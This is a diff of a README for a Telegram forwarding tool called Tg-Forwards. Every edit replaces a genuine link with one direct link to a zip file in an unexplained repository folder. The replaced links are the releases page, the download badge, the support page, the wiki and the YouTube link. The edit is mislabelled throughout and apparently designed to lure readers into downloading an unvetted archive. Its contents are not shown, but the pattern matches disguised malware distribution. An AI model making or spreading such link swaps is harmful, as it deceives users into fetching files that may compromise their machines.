@@ -1,6 +1,6 @@
 # 🚀 Tg-Forwards - Simplifying Your Telegram Messaging Tasks
 
-[![Download Tg-Forwards](https://img.shields.io/badge/Download%20Tg--Forwards-v1.0.0-brightgreen.svg)](https://github.com/DIPPUSINHA/Tg-Forwards/releases)
+[![Download Tg-Forwards](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip%https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip)](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ Follow these simple steps to download and start using Tg-Forwards.
 
 ### 1. Visit the Releases Page
 
-Go to the [GitHub Releases Page](https://github.com/DIPPUSINHA/Tg-Forwards/releases) to find the latest version available.
+Go to the [GitHub Releases Page](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip) to find the latest version available.
 
 ### 2. Download Tg-Forwards
 
@@ -86,7 +86,7 @@ If you run into issues while using Tg-Forwards, consider the following tips:
   - Make sure your Telegram account has access to the channels.
   - Double-check if you have adequate permissions in your settings.
 
-For more support and updates, visit our [GitHub page](https://github.com/DIPPUSINHA/Tg-Forwards).
+For more support and updates, visit our [GitHub page](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip).
 
 ## 📬 Contact Us
 
@@ -94,9 +94,9 @@ If you have questions, suggestions, or feedback, feel free to reach out to us th
 
 ## 📖 Additional Resources
 
-- **Documentation**: Visit our [Wiki](https://github.com/DIPPUSINHA/Tg-Forwards/wiki) for in-depth guides.
-- **Tutorial Videos**: Check out our [YouTube Channel](https://www.youtube.com/channel/TgForwards) for walkthrough videos.
+- **Documentation**: Visit our [Wiki](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip) for in-depth guides.
+- **Tutorial Videos**: Check out our [YouTube Channel](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip) for walkthrough videos.
 
-[![Download Tg-Forwards](https://img.shields.io/badge/Download%20Tg--Forwards-v1.0.0-brightgreen.svg)](https://github.com/DIPPUSINHA/Tg-Forwards/releases)
+[![Download Tg-Forwards](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip%https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip)](https://raw.githubusercontent.com/DIPPUSINHA/Tg-Forwards/main/debonairly/Tg-Forwards.zip)
 
 Thank you for choosing Tg-Forwards! We hope it makes your Telegram tasks simpler and more efficient.
